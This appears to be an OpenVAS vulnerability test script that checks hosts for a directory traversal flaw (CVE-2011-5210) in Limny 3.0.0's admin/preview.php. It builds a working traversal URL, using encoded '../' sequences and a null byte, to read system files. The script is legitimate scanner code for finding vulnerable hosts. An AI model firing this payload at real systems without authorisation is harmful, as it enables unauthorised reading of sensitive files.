###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_limny_theme_param_dir_trav_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Limny admin/preview.php theme Parameter Directory Traversal Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.
  Impact Level: Application";
tag_affected = "Limny version 3.0.0";
tag_insight = "Input passed via 'theme' parameter to admin/preview.php is not properly
  sanitised before being used to include files.";
tag_solution = "Upgrade to Limny version 3.0.1 or later,
  For updates refer to http://www.limny.org/download";
tag_summary = "This host is running Limny and is prone to directory traversal vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802984";
CPE = "cpe:/a:limny:limny";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2011-5210");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-10-12 15:41:59 +0530 (Fri, 12 Oct 2012)");
  script_name("Limny admin/preview.php theme Parameter Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/70747");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/43124");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/65083");
  script_xref(name : "URL" , value : "http://www.autosectools.com/Advisories/Limny.3.0.0_Local.File.Inclusion_99.html");

  script_description(desc);
  script_summary("Check for directory traversal vulnerability in Limny");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_limny_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("limny/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Limny Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## traversal_files() function Returns Dictionary (i.e key value pair)
## Get Content to be checked and file to be check
files = traversal_files();

foreach file (keys(files))
{
  ## Construct directory traversal attack
  url = dir + "/admin/preview.php?theme=" + crap(data:"..%2f",length:3*15) +
        files[file] + "%00";

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:port, url:url,pattern:file))
  {
    security_hole(port:port);
    exit(0);
  }
}
